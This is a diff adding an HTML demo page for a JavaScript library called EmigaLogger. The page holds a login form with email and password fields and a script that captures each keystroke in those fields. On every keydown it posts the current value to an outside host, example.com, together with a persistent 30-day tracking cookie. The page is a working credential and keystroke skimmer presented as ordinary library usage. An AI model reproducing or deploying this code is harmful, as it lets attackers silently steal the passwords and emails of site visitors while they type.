@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Input logger by EmigaLogger</title>
+</head>
+<body>
+
+<form action="https://example.com" method="post" accept-charset="utf-8">
+    <input type="text" name="email" placeholder="email" />
+    <input type="text" name="password" placeholder="password" />
+</form>
+
+<script type="text/javascript" src="../dist/EmigaLogger.min.js"></script>
+<script type="text/javascript">
+    (new EmigaInit((e)=> {
+        const Data  = (new EmigaData());
+        const Token = (new EmigaCookies()).Get('X-UUID') || (new EmigaToken()).uuid();
+
+        const Email     = (new EmigaSelector()).Select('input[name=email]');
+        const Password  = (new EmigaSelector()).Select('input[name=password]');
+
+        (new EmigaLogger()).Log(Email,'keydown',(e)=>{
+            Data.Send('https://example.com',{
+                method: 'POST',
+                headers: {
+                    'X-UUID': Token
+                },
+                body: JSON.stringify({
+                    uuid   : Token,
+                    data   : {
+                        email : (new EmigaSelector()).Value(Email)
+                    },
+                    cookie : (new EmigaCookies()).Cookie('X-UUID',(new EmigaToken()).uuid(),30)
+                })
+            });
+        });
+        (new EmigaLogger()).Log(Password,'keydown',(e)=>{
+            Data.Send('https://example.com',{
+                method: 'POST',
+                headers: {
+                    'X-UUID': Token
+                },
+                body: JSON.stringify({
+                    uuid   : Token,
+                    data   : {
+                        password : (new EmigaSelector()).Value(Password)
+                    },
+                    cookie : (new EmigaCookies()).Cookie('X-UUID',(new EmigaToken()).uuid(),30)
+                })
+            });
+        });
+
+    }));
+</script>
+</body>
+</html>
